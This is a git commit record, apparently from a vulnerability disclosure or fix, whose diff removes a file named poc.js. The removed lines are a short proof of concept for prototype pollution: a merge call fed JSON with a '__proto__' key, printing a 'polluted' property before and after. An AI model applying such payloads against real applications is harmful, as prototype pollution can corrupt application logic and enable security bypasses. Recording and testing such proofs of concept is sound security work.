e7d4c2fba9b7acd7b5cdc390358bcfc2b8a0d595
arjunshibu <arjunshibu1999@gmail.com>
2021-02-11 15:34:11 +0530

    poc removed

--- poc.js
+++
@@ -1,5 +0,0 @@
-const merge = require('./dist').default
-
-console.log(`Before: ${{}.polluted}`)
-merge([{}, JSON.parse('{"__proto__": {"polluted": true}, "foo": 2}')])
-console.log(`After: ${{}.polluted}`)
